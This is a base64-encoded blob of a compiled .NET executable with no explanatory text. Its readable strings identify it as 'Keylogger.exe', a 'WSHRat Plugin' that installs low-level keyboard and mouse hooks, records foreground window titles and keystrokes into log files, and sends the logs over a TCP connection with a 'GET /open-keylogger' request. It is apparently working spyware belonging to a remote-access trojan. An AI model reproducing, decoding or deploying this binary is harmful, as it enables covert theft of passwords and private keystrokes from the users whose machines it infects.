EBCQCQACgBCQCUAI0BCQCYAJIBCQCcAJcBCQC4AMkBCQC8AM4BCQDAANMBCQDEANgBCQDIAN0BCQDMAOIBCQDQAOcBCQDUAOwBCQDYAPEBCQDcAPYBCQDgAPsBIAAjACgBKQCbAIsDLgCbBDUILgCzBDUILgCTBB0ILgCLBP4ELgBjBLUHLgCjBEAILgCrBP4ELgBzBMcHLgBbAf4ELgBrBL4HLgB7BOYHLgCDBPMHQAAzACgBQAATAPsCQwATAPsCQwAbAAoDSQCbAGMDYAAjACgBYwAbAAoDYwATAPsCaQCbAKoDgAAzACgBgwCLACgBgwAbAAoDgwCTACgBiQCbAJwDoAAzACgBowATAPsCowBDASYEqQCbAHcDwAAzACgBwQBLASgBwwBDAYUEwwATAPsC4AAzACgB4QBjASgB4QBLASgB4wATAPsC4wBbAf4EAAEzACgBCQETAAMHIAEzACgBKQETAAMHQAEzACgBYAETAPsCYAEzACgBaQE7BIQHaQFDBCgBaQEjACgBgAETAPsCiQE7BIQHiQEjACgBiQFDBCgBoAETAPsCowFbAigBqQE7BIQHqQEjACgBqQFDBCgBwAETAPsCyQEjACgByQE7BIQHyQFDBCgB4AETAPsC6QE7BIQH6QFDBCgB6QEjACgBAAITAPsCAAIzACgBCQI7BIQHCQJDBCgBCQIjACgBIAIzACgBIAITAPsCKQKbAIsHQAITAPsCQAIzACgBYAIzACgBYAITAPsCYwKLACgBgAIzACgBgwIjACgBgwKTACgBgwJjASgBgwIbAMIGgwKLACgBoAIzACgBowIbACoHowJjASgBowITAAMHwAIzACgBwAITAPsCwwKTACgBwwKLACgBwwJjASgBwwIjACgB4AIzACgBAAMzACgBAAMTAPsCIAMjACgBYAMjACgBIAQjACgBQAQjACgBgAQjACgBoAQjACgBAAcjACgBIAcjACgBQAfrAygBwQfzA5QGIAhjASgBIAhrAigBwAgjACgBoAojACgB2QCsB+sAqgdFA0oDTwNUA1kD9QMDBA0EEQQVBBoEDQQRBBUEGgR/BAME8wQsBVkFZwV/BZYFqgWvBeoFGAYtBjQGdAaMBrUGvQYVBxEEEQQRBBEEEQQRBBUHnAcIAAEAAABsBTwAAAB7BUgABAABAAcABgATAAcAFAAIABUACgAWABEAAAD6AVwAAADVAmEAAABiAmYAAADhAmsAAADnAnAAAADHA6oAAACtCV8CAADGCXwCAABFCoECAACeC5QCAACmC5kCAAC7C5kCAADNC5kCAADfC5kCAADyC5kCAAACDJkCAAAfDJQCCAAhAAIAEAAiAAIAAgAEAAMACAAkAAQAEAAlAAQAAgAFAAUAAgAGAAcAAgAHAAkAAgAIAAsAAgAXAA0AAgA4AA8AAQA5AA8AAgBCABEAAQBEABMAAgBDABMAAgBHABUAAgBIABcAAQBJABcAAgBKABkAAQBLABkAAQBNABsAAgBMABsAAgBOAB0AAQBPAB0AAgBQAB8AAQBRAB8AAgBSACEAAQBTACEAAgBUACMA0RHSFN0UdQB1AHUAdQCeACIDKQMwAzcDPgPnBAQFCwUGAzkAKwQBAAYDOwBWBAEABgM9AHkEAQAHAa0AKAwCAEcBrwBDDAIARwGxAF0MAgAGAbMAcgwCAAYBtQCxDAIAQAG3APEMAgAHAbkAAg0CAEcBuwAVDQIAQAG9ACkNAgBGAb8AVQ0DAEYBwQB7DQIABwHDAI8NAgAHAcUAjw0CAASAAAABAAEAAAAAAAAAAAAAAI8AAAACAAAAAAAAAAAAAAABAAoAAAAAAAgAAAAAAAAAAAAAAAoAEwAAAAAAAgAAAAAAAAAAAAAAAQAGAwAAAAACAAAAAAAAAAAAAAAKAEgIAAAAAAIAAAAAAAAAAAAAAAEAAwIAAAAAAAAAAAEAAABIFgAABQAEAAYABAAHAAQACQAIAAoACAALAAgADAAIAA0ACAAOAAgADwAIABAACAARAAgAEgAIAAAAEAAOACADAAAQABMAIAMAAAAAFQAgAwAAEAApACADAAAAACsAIAM3ANYDNwDuBAIAFQADABUAAAAAAAA8TW9kdWxlPgBtc2NvcmxpYgBNaWNyb3NvZnQuVmlzdWFsQmFzaWMATXlBcHBsaWNhdGlvbgBLZXlsb2dnZXIuTXkATXlDb21wdXRlcgBNeVByb2plY3QATXlGb3JtcwBNeVdlYlNlcnZpY2VzAFRocmVhZFNhZmVPYmplY3RQcm92aWRlcmAxAEhvb2sAS2V5bG9nZ2VyAEtleWJvYXJkQ2FsbEJhY2sATW91c2VDYWxsQmFjawBIb29rVHlwZQBXTV9LRVlCT0FSRF9NU0cAS0JETExIT09LU1RSVUNURmxhZ3MAS0JETExIT09LU1RSVUNUAEtleWJvYXJkQ2hhbmdlRXZlbnRIYW5kbGVyAFdNX01PVVNFX01TRwBNU0xMSE9PS1NUUlVDVABNb3VzZUNoYW5nZUV2ZW50SGFuZGxlcgBNb2R1bGUxAFJlc291cmNlcwBLZXlsb2dnZXIuTXkuUmVzb3VyY2VzAE15U2V0dGluZ3MATXlTZXR0aW5nc1Byb3BlcnR5AFdpbjMyQVBJAE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5BcHBsaWNhdGlvblNlcnZpY2VzAENvbnNvbGVBcHBsaWNhdGlvbkJhc2UALmN0b3IATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZXMAQ29tcHV0ZXIAU3lzdGVtAE9iamVjdAAuY2N0b3IAZ2V0X0NvbXB1dGVyAG1fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBnZXRfQXBwbGljYXRpb24AbV9BcHBPYmplY3RQcm92aWRlcgBVc2VyAGdldF9Vc2VyAG1fVXNlck9iamVjdFByb3ZpZGVyAGdldF9Gb3JtcwBtX015Rm9ybXNPYmplY3RQcm92aWRlcgBnZXRfV2ViU2VydmljZXMAbV9NeVdlYlNlcnZpY2VzT2JqZWN0UHJvdmlkZXIAQXBwbGljYXRpb24ARm9ybXMAV2ViU2VydmljZXMAQ3JlYXRlX19JbnN0YW5jZV9fAFN5c3RlbS5XaW5kb3dzLkZvcm1zAEZvcm0AVABJbnN0YW5jZQBEaXNwb3NlX19JbnN0YW5jZV9fAGluc3RhbmNlAFN5c3RlbS5Db2xsZWN0aW9ucwBIYXNodGFibGUAbV9Gb3JtQmVpbmdDcmVhdGVkAEVxdWFscwBvAEdldEhhc2hDb2RlAFR5cGUAR2V0VHlwZQBUb1N0cmluZwBnZXRfR2V0SW5zdGFuY2UAbV9UaHJlYWRTdGF0aWNWYWx1ZQBHZXRJbnN0YW5jZQBfX0VOQ0FkZFRvTGlzdAB2YWx1ZQBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBMaXN0YDEAV2Vha1JlZmVyZW5jZQBfX0VOQ0xpc3QARGVsZWdhdGUAU2V0V2luZG93c0hvb2tFeABIb29rUHJvYwBoSW5zdGFuY2UAd1BhcmFtAENhbGxOZXh0SG9va0V4AGlkSG9vawBuQ29kZQBsUGFyYW0AVW5ob29rV2luZG93c0hvb2tFeABEaWN0aW9uYXJ5YDIAaEhvb2tzAEtleWJvYXJkaG9va3Byb2MATW91c2Vob29rcHJvYwBob29rVHlwZQBVbkhvb2sAYWRkX0tleWJvYXJkQ2hhbmdlAG9iagBLZXlib2FyZENoYW5nZUV2ZW50AHJlbW92ZV9LZXlib2FyZENoYW5nZQBMb3dMZXZlbEtleWJvYXJkUHJvYwBhZGRfTW91c2VDaGFuZ2UATW91c2VDaGFuZ2VFdmVudAByZW1vdmVfTW91c2VDaGFuZ2UATG93TGV2ZWxNb3VzZVByb2MAS2V5Ym9hcmRDaGFuZ2UATW91c2VDaGFuZ2UATXVsdGljYXN0RGVsZWdhdGUAVGFyZ2V0T2JqZWN0AFRhcmdldE1ldGhvZABJQXN5bmNSZXN1bHQAQXN5bmNDYWxsYmFjawBCZWdpbkludm9rZQBEZWxlZ2F0ZUNhbGxiYWNrAERlbGVnYXRlQXN5bmNTdGF0ZQBFbmRJbnZva2UARGVsZWdhdGVBc3luY1Jlc3VsdABJbnZva2UARW51bQB2YWx1ZV9fAFdIX0pPVVJOQUxSRUNPUkQAV0hfSk9VUk5BTFBMQVlCQUNLAFdIX0tFWUJPQVJEAFdIX0dFVE1FU1NBR0UAV0hfQ0FMTFdORFBST0MAV0hfQ0JUAFdIX1NZU01TR0ZJTFRFUgBXSF9NT1VTRQBXSF9IQVJEV0FSRQBXSF9ERUJVRwBXSF9TSEVMTABXSF9GT1JFR1JPVU5ESURMRQBXSF9DQUxMV05EUFJPQ1JFVABXSF9LRVlCT0FSRF9MTABXSF9NT1VTRV9MTABXTV9LRVlET1dOAFdNX0tFWVVQAFdNX1NZU0tFWURPV04AV01fU1lTS0VZVVAATExLSEZfRVhURU5ERUQATExLSEZfSU5KRUNURUQATExLSEZfQUxURE9XTgBMTEtIRl9VUABWYWx1ZVR5cGUAS2V5cwB2a0NvZGUAc2NhbkNvZGUAZmxhZ3MAdGltZQBkd0V4dHJhSW5mbwBjYW5jZWwAV01fTU9VU0VNT1ZFAFdNX0xCVVRUT05ET1dOAFdNX0xCVVRUT05VUABXTV9SQlVUVE9ORE9XTgBXTV9SQlVUVE9OVVAAV01fTU9VU0VXSEVFTFVQAFdNX01PVVNFV0hFRUxET1dOAFdNX01PVVNFV0hFRUwAV01fTU9VU0VXSEVFTE1PVkVVUABXTV9NT1VTRVdIRUVMTU9WRURPV04AV01fTU9VU0VIV0hFRUwAU3lzdGVtLkRyYXdpbmcAUG9pbnQAcHQAbW91c2VEYXRhAF9XaW5Ib29rAGdldF9XaW5Ib29rAHNldF9XaW5Ib29rAFdpdGhFdmVudHNWYWx1ZQBTeXN0ZW0uTmV0LlNvY2tldHMAVGNwQ2xpZW50AHNvY2tldABhcmdzAGlzX29mZmxpbmUAbG9nZmlsZQBtYWluAFJ1bktleWxvZ2dlck9mZmxpbmUAU29ja2V0Q2xvc2VkAExhc3RDaGVja2VkRm9yZWdyb3VuZFRpdGxlAG9uU3RhcnRLZXlib2FyZFNlc3Npb25DbGlja3MAc2F2ZUtleUxvZwBsb2cAc2VuZEtleUxvZwBXaW5Ib29rX0tleWJvYXJkQ2hhbmdlAG9uU3RhcnRNb3VzZVNlc3Npb25Nb3ZlcwBvblN0YXJ0TW91c2VTZXNzaW9uQ2xpY2tzAFdpbkhvb2tfTW91c2VDaGFuZ2UAV2luSG9vawBTeXN0ZW0uUmVzb3VyY2VzAFJlc291cmNlTWFuYWdlcgByZXNvdXJjZU1hbgBTeXN0ZW0uR2xvYmFsaXphdGlvbgBDdWx0dXJlSW5mbwByZXNvdXJjZUN1bHR1cmUAZ2V0X1Jlc291cmNlTWFuYWdlcgBnZXRfQ3VsdHVyZQBzZXRfQ3VsdHVyZQBWYWx1ZQBDdWx0dXJlAFN5c3RlbS5Db25maWd1cmF0aW9uAEFwcGxpY2F0aW9uU2V0dGluZ3NCYXNlAGRlZmF1bHRJbnN0YW5jZQBnZXRfRGVmYXVsdABnZXRfU2Vzc2lvbktleWJvYXJkQ2xpY2sAc2V0X1Nlc3Npb25LZXlib2FyZENsaWNrAGdldF9TZXNzaW9uTW91c2VNb3ZlcwBzZXRfU2Vzc2lvbk1vdXNlTW92ZXMAZ2V0X1Nlc3Npb25Nb3VzZUNsaWNrAHNldF9TZXNzaW9uTW91c2VDbGljawBnZXRfVG90YWxLZXlib2FyZENsaWNrAHNldF9Ub3RhbEtleWJvYXJkQ2xpY2sAZ2V0X1RvdGFsTW91c2VNb3ZlcwBzZXRfVG90YWxNb3VzZU1vdmVzAGdldF9Ub3RhbE1vdXNlQ2xpY2sAc2V0X1RvdGFsTW91c2VDbGljawBEZWZhdWx0AFNlc3Npb25LZXlib2FyZENsaWNrAFNlc3Npb25Nb3VzZU1vdmVzAFNlc3Npb25Nb3VzZUNsaWNrAFRvdGFsS2V5Ym9hcmRDbGljawBUb3RhbE1vdXNlTW92ZXMAVG90YWxNb3VzZUNsaWNrAGdldF9TZXR0aW5ncwBTZXR0aW5ncwBHZXRLZXlib2FyZExheW91dABkd0xheW91dABHZXRLZXlib2FyZFN0YXRlAGtleVN0YXRlAEdldEtleVN0YXRlAG5WaXJ0S2V5AE1hcFZpcnR1YWxLZXlFeAB1Q29kZQBuTWFwVHlwZQBkd2hrbABTeXN0ZW0uVGV4dABTdHJpbmdCdWlsZGVyAFRvVW5pY29kZUV4AHdWaXJ0S2V5AHdTY2FuQ29kZQBscEtleVN0YXRlAGxwQ2hhcgBjY2hCdWZmAHdGbGFncwBTZXRDdXJzb3JQb3MAWABZAEdldERvdWJsZUNsaWNrVGltZQBHZXRGb3JlZ3JvdW5kV2luZG93AEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZABod25kAGxwZHdQcm9jZXNzSWQAR2V0V2luZG93VGV4dABoV25kAGxwU3RyaW5nAG5NYXhDb3VudABHZXRXaW5kb3dUZXh0TGVuZ3RoAFdpbmRvd0Zyb21Qb2ludAB4AHkAU3lzdGVtLkNvbXBvbmVudE1vZGVsAEVkaXRvckJyb3dzYWJsZUF0dHJpYnV0ZQBFZGl0b3JCcm93c2FibGVTdGF0ZQBTeXN0ZW0uQ29kZURvbS5Db21waWxlcgBHZW5lcmF0ZWRDb2RlQXR0cmlidXRlAFN5c3RlbS5EaWFnbm9zdGljcwBEZWJ1Z2dlck5vblVzZXJDb2RlQXR0cmlidXRlAERlYnVnZ2VySGlkZGVuQXR0cmlidXRlAE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21waWxlclNlcnZpY2VzAFN0YW5kYXJkTW9kdWxlQXR0cmlidXRlAEhpZGVNb2R1bGVOYW1lQXR0cmlidXRlAFN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24ASGVscEtleXdvcmRBdHRyaWJ1dGUAU3lzdGVtLlJlZmxlY3Rpb24AVGFyZ2V0SW52b2NhdGlvbkV4Y2VwdGlvbgBDb250cm9sAGdldF9Jc0Rpc3Bvc2VkAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAENvbnRhaW5zS2V5AFN0cmluZwBVdGlscwBHZXRSZXNvdXJjZVN0cmluZwBJbnZhbGlkT3BlcmF0aW9uRXhjZXB0aW9uAEFkZABBY3RpdmF0b3IAQ3JlYXRlSW5zdGFuY2UAUHJvamVjdERhdGEARXhjZXB0aW9uAFNldFByb2plY3RFcnJvcgBnZXRfSW5uZXJFeGNlcHRpb24AZ2V0X01lc3NhZ2UAQ2xlYXJQcm9qZWN0RXJyb3IAUmVtb3ZlAENvbXBvbmVudABEaXNwb3NlAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAUnVudGltZUhlbHBlcnMAR2V0T2JqZWN0VmFsdWUATXlHcm91cENvbGxlY3Rpb25BdHRyaWJ1dGUAVGhyZWFkU3RhdGljQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAFN5c3RlbS5UaHJlYWRpbmcATW9uaXRvcgBFbnRlcgBnZXRfQ291bnQAZ2V0X0NhcGFjaXR5AGdldF9JdGVtAGdldF9Jc0FsaXZlAHNldF9JdGVtAFJlbW92ZVJhbmdlAHNldF9DYXBhY2l0eQBFeGl0AEludFB0cgBaZXJvAE5vdEltcGxlbWVudGVkRXhjZXB0aW9uAERlYnVnAFByaW50AEJvb2xlYW4AQ29tYmluZQBNYXJzaGFsAFB0clRvU3RydWN0dXJlAG9wX0V4cGxpY2l0AG9wX0VxdWFsaXR5AERsbEltcG9ydEF0dHJpYnV0ZQBVc2VyMzIuZGxsAEZsYWdzQXR0cmlidXRlAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAF9MYW1iZGEkX18xAGEwAERlYnVnZ2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAVGhyZWFkAENvbnZlcnNpb25zAFRvSW50ZWdlcgBDb25uZWN0AENvbmNhdABFbmNvZGluZwBnZXRfQVNDSUkAR2V0Qnl0ZXMATmV0d29ya1N0cmVhbQBHZXRTdHJlYW0AV3JpdGUARmx1c2gAVGhyZWFkU3RhcnQAU3RhcnQAU2F2ZQBSdW4ARGF0ZVRpbWUAZ2V0X1N0YXJ0dXBQYXRoAFN5c3RlbS5JTwBEaXJlY3RvcnkARXhpc3RzAERpcmVjdG9yeUluZm8AQ3JlYXRlRGlyZWN0b3J5AGdldF9Ob3cAU3RyZWFtAFJlYWRCeXRlAEZpbGUAQXBwZW5kQWxsVGV4dABQYXJhbWV0ZXJpemVkVGhyZWFkU3RhcnQAQ2xvc2UASW50MzIAVUludDMyAEFkZFRpY2tzAFVJbnQ2NABPcGVyYXRvcnMAQ29tcGFyZVN0cmluZwBCeXRlAFN0cmluZ3MAQXNjVwBLZXlib2FyZABnZXRfS2V5Ym9hcmQAZ2V0X0N0cmxLZXlEb3duAGdldF9BbHRLZXlEb3duAEludGVyYWN0aW9uAElJZgBDb25jYXRlbmF0ZU9iamVjdABnZXRfU2hpZnRLZXlEb3duAGdldF9MZW5ndGgAQ2hyVwBnZXRfWABnZXRfWQBTVEFUaHJlYWRBdHRyaWJ1dGUAQWNjZXNzZWRUaHJvdWdoUHJvcGVydHlBdHRyaWJ1dGUAUmVmZXJlbmNlRXF1YWxzAEFzc2VtYmx5AGdldF9Bc3NlbWJseQBTZXR0aW5nc0Jhc2UAU3luY2hyb25pemVkAERlZmF1bHRTZXR0aW5nVmFsdWVBdHRyaWJ1dGUAVXNlclNjb3BlZFNldHRpbmdBdHRyaWJ1dGUAdXNlcjMyLmRsbAB1c2VyMzIATWFyc2hhbEFzQXR0cmlidXRlAFVubWFuYWdlZFR5cGUAT3V0QXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidX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